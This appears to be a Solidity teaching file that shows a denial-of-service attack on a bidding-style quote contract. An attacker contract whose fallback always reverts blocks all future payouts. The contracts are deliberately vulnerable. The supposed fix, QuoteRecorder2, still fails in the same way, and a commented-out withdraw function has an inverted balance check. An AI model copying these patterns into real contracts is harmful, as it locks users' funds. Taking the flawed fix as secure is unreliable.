// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract QuoteRecorder {
    address payable public currentQuoteLover;
    uint256 public balance;
    string public currentQuote;
     
    function record(string memory quote) external payable {
        require(msg.value > balance);
        (bool sent, ) = currentQuoteLover.call{value: balance}("");
        require(sent, "You failed to send ether");
        balance = msg.value;
        currentQuoteLover = payable(msg.sender);
        currentQuote = quote;
    }

}


contract Attack{
    function attack(QuoteRecorder _quoteRecorder) public payable{
        _quoteRecorder.record{value: msg.value}("Be careful of DOS hacks");
    }
}




contract QuoteRecorder2{
    address payable public currentQuoteLover;
    uint256 public balance;
    string public currentQuote;
    mapping(address => uint) balances;
     
    function record(string memory quote) external payable {
        require(msg.value > balance);
        (bool sent, ) = currentQuoteLover.call{value: balance, gas:5000}("");
        require(sent, "You failed to send ether");
        balance = msg.value;
        currentQuoteLover = payable(msg.sender);
        currentQuote = quote;
    }

    // function withdraw(uint _amount) external {
    //     require(balances[msg.sender] <= _amount, "You dont have that much");
    //     balances[msg.sender] -= _amount;
    //     address payable receiver = payable(msg.sender);
    //     receiver.transfer(_amount);
    // }


}



contract Attack2{
    function attack(QuoteRecorder _quoteRecorder) public payable{
         _quoteRecorder.record{value: msg.value}("Be careful of DOS hacks");
    }

    fallback() external payable {
        assert(1 == 0);
    }
}


